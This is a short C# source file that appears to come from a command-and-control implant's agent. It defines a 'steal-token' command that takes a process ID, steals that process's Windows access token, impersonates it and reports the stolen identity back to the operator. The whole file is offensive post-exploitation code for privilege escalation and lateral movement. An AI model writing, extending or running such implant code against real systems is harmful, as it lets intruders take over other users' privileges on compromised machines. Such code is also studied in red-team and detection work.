using Agent.Commands;
using Agent.Helpers;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WinAPI.Wrapper;

namespace Commands
{
    public class StealTokenCommand : AgentCommand
    {
        public override string Name => "steal-token";
        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            if (!int.TryParse(task.SplittedArgs[0], out var pid))
            {
                context.Result.Result += $"Faile to parse ProcessId";
                return;
            }

            var wrapper = WinAPIWrapper.CreateInstance();
            var hToken = wrapper.StealToken(pid);

            ImpersonationHelper.Impersonate(hToken);
            var identity = new WindowsIdentity(hToken);
            context.Result.Result += $"Successfully impersonate token {identity.Name}";
        }
    }
}
